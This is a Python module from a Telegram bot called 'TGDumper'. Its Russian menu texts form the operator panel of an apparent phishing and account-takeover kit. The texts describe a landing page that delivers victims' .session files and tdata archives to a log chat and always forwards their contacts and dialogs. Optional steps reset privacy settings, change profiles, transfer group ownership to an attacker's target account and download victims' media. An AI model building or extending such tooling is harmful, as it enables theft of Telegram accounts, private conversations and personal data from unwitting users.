from __future__ import annotations

from aiogram.exceptions import TelegramBadRequest
from aiogram.types import CallbackQuery

from bot.keyboards import BOOL_FIELDS, TEXT_FIELDS
from web.services.migration.settings import settings_repo

FIELD_TITLES = {key: title for key, title in TEXT_FIELDS + BOOL_FIELDS}
FIELD_BACK = {key: "menu:account" for key, _ in TEXT_FIELDS}


async def format_settings() -> str:
	s = await settings_repo.load()
	lines = [
		"<b>👤 Управление аккаунтом</b>",
		"",
		f"• Username: <code>{s.target_username or '—'}</code>",
		f"• Bio: <code>{s.bio or '—'}</code>",
		f"• Целевой аккаунт: <code>{s.target_account or '—'}</code>",
		f"• Группа: <code>{s.notify_group_link or '—'}</code>",
		f"• Сообщение: <code>{s.notify_message or '—'}</code>",
		f"• Прокси: <code>{s.default_proxy or '—'}</code>",
		f"• Chat ID логов: <code>{s.bot_chat_id or '—'}</code>",
		"",
		"<b>После входа:</b>",
		f"• Открыть приватность: {'✅' if s.open_privacy else '⬜️'}",
		f"• Сменить username/bio: {'✅' if s.change_profile else '⬜️'}",
		f"• Маяк в вашу группу: {'✅' if s.notify_group else '⬜️'}",
		f"• Передать ваши группы: {'✅' if s.migrate_groups else '⬜️'}",
		f"• Скачать фото/видео: {'✅' if s.export_media else '⬜️'}",
		"",
		"<i>Контакты и диалоги всегда уходят в лог-чат</i>",
	]
	return "\n".join(lines)


def steps_menu_text() -> str:
	return (
		"<b>⚙️ Что делать после входа</b>\n\n"
		"<b>Всегда</b> (отдельной кнопки нет):\n"
		"• контакты, диалоги, info → в чат логов\n\n"
		"<b>По желанию</b> (✅ вкл / ⬜️ выкл):\n"
		"• <b>Открыть приватность</b> — кто может писать/звонить\n"
		"• <b>Сменить username/bio</b> — из полей настроек\n"
		"• <b>Маяк в вашу группу</b> — зайти по ссылке, написать, выйти\n"
		"• <b>Передать ваши группы</b> — инвайт целевого + владение\n"
		"• <b>Скачать фото/видео</b> — долго и тяжело\n\n"
		"Нажмите кнопку, чтобы переключить."
	)


def actions_menu_text() -> str:
	return (
		"<b>🛠 Служебное</b>\n\n"
		"• <b>Показать настройки</b> — текущий конфиг\n"
		"• <b>Собрать tdata</b> — из уже лежащих .session "
		"(для Desktop; после веб-входа tdata обычно уже в логах)\n"
		"• <b>Заново: маяк + перенос</b> — сброс только этих двух шагов, "
		"чтобы при следующем входе они снова выполнились"
	)


async def root_text() -> str:
	s = await settings_repo.load()
	return (
		"<b>TGDumper</b>\n"
		"Выберите раздел.\n\n"
		"🌐 <b>Сайт</b> — контент лендинга (аватар, фото, соцсети)\n"
		"👤 <b>Управление аккаунтом</b> — миграция, целевой аккаунт, логи\n\n"
		f"Логи → chat_id: <code>{s.bot_chat_id or '—'}</code>\n"
		"<i>После входа на сайт сюда приходят .session и tdata.zip</i>"
	)


async def account_text() -> str:
	return await format_settings()


async def network_text(extra: str = "") -> str:
	text = await format_settings()
	if extra:
		text += f"\n{extra}"
	return text


async def edit_menu(callback: CallbackQuery, text: str, markup) -> None:
	try:
		await callback.message.edit_text(text, reply_markup=markup, parse_mode="HTML")
	except TelegramBadRequest as error:
		if "message is not modified" not in str(error):
			raise
	await callback.answer()
